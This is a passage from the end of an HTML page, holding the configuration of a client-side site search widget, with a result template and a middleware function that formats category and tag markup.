    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

